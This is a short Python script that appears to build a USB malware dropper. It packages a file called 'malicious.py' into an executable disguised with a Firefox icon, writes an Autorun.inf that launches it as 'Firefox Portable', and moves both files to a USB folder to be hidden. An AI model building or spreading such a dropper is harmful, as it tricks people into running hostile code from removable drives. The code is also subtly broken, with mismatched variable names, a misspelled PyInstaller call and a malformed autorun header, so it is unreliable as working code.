import PyInstaller.__main__
import shutil
import os

filename = "malicious.py"
exenam = "behign.exe"
icon = "Firefox.ico"
pwd = os.getcwd()
usbdir = os.path.join(pwd, "USB")

if os.path.isfile(exename):
    os.remove(exename)
print("Creating EXE")

# Create executable from Python script
PyInstaller.__main__.ru([
    "malicious.py",
    "--onefile",
    "--clean",
    "--log-level=ERROR",
    "--name="+exename,
    "--icon="+icon
])

print("EXE Created")

# Clean up after PyInstaller
shutil.move(os.path.join(pwd, "dist", exename), pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename+".spec")

print("Creating Autorun file")

# Create  Autorun file
with open("Autorun.inf", "w") as o:
    o.write("(Autorun)\n")
    o.write("Open="+exename+"\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon="+exename+"\n")

print("Setting up USB")


# Move files to USB and set to hidden
shutil.move(exename, sbdir)
shutil.move("Autorun.inf", sbdir)
print("attrib +h " + os.path.join(usbdir, "Autorun.inf"))
